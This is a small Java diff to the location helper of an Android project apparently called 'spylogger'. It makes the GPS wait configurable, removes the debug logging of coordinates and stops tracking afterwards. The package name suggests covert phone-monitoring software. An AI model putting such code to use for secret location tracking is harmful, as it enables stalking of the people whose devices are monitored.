@@ -3,7 +3,6 @@ package com.gravatasufoca.spylogger.helpers;
 import android.content.Context;
 import android.os.Handler;
 import android.os.Looper;
-import android.util.Log;
 
 import com.gravatasufoca.spylogger.services.GPSTracker;
 import com.gravatasufoca.spylogger.utils.Utils;
@@ -17,7 +16,7 @@ import java.io.IOException;
 
 public class ServicosHelper {
 
-    public void getLocation(final Context context, final TaskComplete callback) {
+    public void getLocation(final Context context, final Integer espera, final TaskComplete callback) {
         final Handler handler = new Handler(Looper.getMainLooper());
         handler.post(new Runnable() {
             @Override
@@ -25,9 +24,8 @@ public class ServicosHelper {
                 GPSTracker gpsTracker = new GPSTracker(context);
                 if (gpsTracker.canGetLocation()) {
                     try {
-                        Thread.sleep(5000);
-                        Log.i("GPS LOCATION", Double.toString(gpsTracker.getLatitude()) + "," + Double.toString(gpsTracker.getLongitude()));
-                        Log.i("GPS LOCATION", Double.toString(gpsTracker.getAccuracy()));
+                        Thread.sleep(espera!=null?espera*1000:5000);
+
                         LocalizacaoVO localizacaoVO=new LocalizacaoVO();
                         localizacaoVO.setLatitude(gpsTracker.getLatitude());
                         localizacaoVO.setLongitude(gpsTracker.getLongitude());
@@ -41,6 +39,7 @@ public class ServicosHelper {
                     } catch (InterruptedException e) {
                         e.printStackTrace();
                     }finally {
+                        gpsTracker.endTracking();
                         gpsTracker=null;
                     }
                 }
